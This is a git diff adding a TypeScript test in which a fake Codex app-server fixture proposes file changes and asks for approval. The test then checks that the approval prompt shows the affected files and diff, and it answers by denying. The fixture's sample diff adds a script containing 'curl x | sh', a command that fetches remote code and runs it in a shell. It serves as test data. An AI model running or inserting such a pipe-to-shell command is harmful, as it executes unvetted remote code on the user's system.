@@ -81,3 +81,31 @@ test('native approval remains answerable throughout the configured core approval
   await run?.done; await fs.rm(dir, { recursive: true, force: true });
  }
 });
+test('a file-change approval shows the files and diff codex announced for that item, without protocol bookkeeping', async () => {
+ const dir = await fs.mkdtemp(path.join(os.tmpdir(), 'codex-file-change-'));
+ // Shapes follow the generated 0.162.1 ItemStartedNotification / FileUpdateChange / FileChangeRequestApprovalParams.
+ const source = `import {createInterface} from 'node:readline';
+const send = x => console.log(JSON.stringify(x));
+createInterface({input:process.stdin}).on('line', line => {
+ const m=JSON.parse(line);
+ if(m.method==='initialize') send({id:m.id,result:{userAgent:'fixture',platformFamily:'unix',platformOs:'linux'}});
+ else if(m.method==='thread/start') send({id:m.id,result:{thread:{id:'thread'}}});
+ else if(m.method==='turn/start') {
+  send({id:m.id,result:{turn:{id:'turn'}}});
+  send({method:'turn/started',params:{threadId:'thread',turn:{id:'turn'}}});
+  send({method:'item/started',params:{threadId:'thread',turnId:'turn',startedAtMs:1,item:{type:'fileChange',id:'patch',status:'inProgress',changes:[{path:'/repo/a.txt',kind:{type:'update',move_path:null},diff:'@@ -1 +1 @@\\\\n-old\\\\n+new'},{path:'/repo/run.sh',kind:{type:'add'},diff:'+curl x | sh'}]}}});
+  send({id:70,method:'item/fileChange/requestApproval',params:{threadId:'thread',turnId:'turn',itemId:'patch',startedAtMs:1,reason:'apply the edit'}});
+ } else if(m.id===70&&!m.method) send({method:'turn/completed',params:{threadId:'thread',turn:{id:'turn',status:'completed',error:null}}});
+}).on('close',()=>process.exit(0));`;
+ try {
+  const file = path.join(dir, 'fixture.ts'); await fs.writeFile(file, source);
+  const provider = new CodexCliProvider({ ...DEFAULT_CONFIG.cli.codex, command: process.execPath, appServerArgs: [file], fullAccess: false }, []);
+  const events: CliEvent[] = [];
+  await provider.send({ prompt: 'instruction', cwd: dir }, event => { events.push(event); if (event.type === 'permission') event.respond(false); }).done;
+  const permission = events.find(event => event.type === 'permission');
+  assert.ok(permission?.type === 'permission');
+  assert.deepEqual(Object.keys(permission.input).sort(), ['diff', 'files', 'reason']);
+  assert.equal(permission.input['files'], 'update /repo/a.txt\nadd /repo/run.sh');
+  assert.match(String(permission.input['diff']), /\+curl x \| sh/);
+ } finally { await fs.rm(dir, { recursive: true, force: true }); }
+});
